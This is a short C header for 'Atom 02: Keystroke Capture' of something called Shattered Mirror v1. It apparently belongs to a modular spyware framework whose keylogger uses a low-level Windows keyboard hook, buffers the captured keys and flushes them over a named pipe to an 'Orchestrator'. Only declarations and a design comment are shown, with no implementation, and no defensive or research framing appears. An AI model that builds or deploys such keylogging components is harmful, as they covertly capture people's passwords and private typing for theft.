#pragma once
/*=============================================================================
 * Shattered Mirror v1 — Atom 02: Keystroke Capture
 *
 * Uses a low-level keyboard hook (WH_KEYBOARD_LL) to capture keystrokes.
 * Data is stored in a circular ring buffer and dispatched to the 
 * Orchestrator (via IPC) in chunks to avoid large memory footprints.
 *===========================================================================*/

#ifndef SMIRROR_ATOM_02_KEY_H
#define SMIRROR_ATOM_02_KEY_H

#include <windows.h>

#define KEYLOG_BUFFER_SIZE 4096

/* Launch the keylogger thread */
DWORD WINAPI KeyloggerAtomMain(LPVOID lpParam);

/* Expose flush mechanism via named pipe command */
BOOL FlushKeyBufferToIPC(HANDLE hPipe, BYTE* pSharedKey);

#endif /* SMIRROR_ATOM_02_KEY_H */
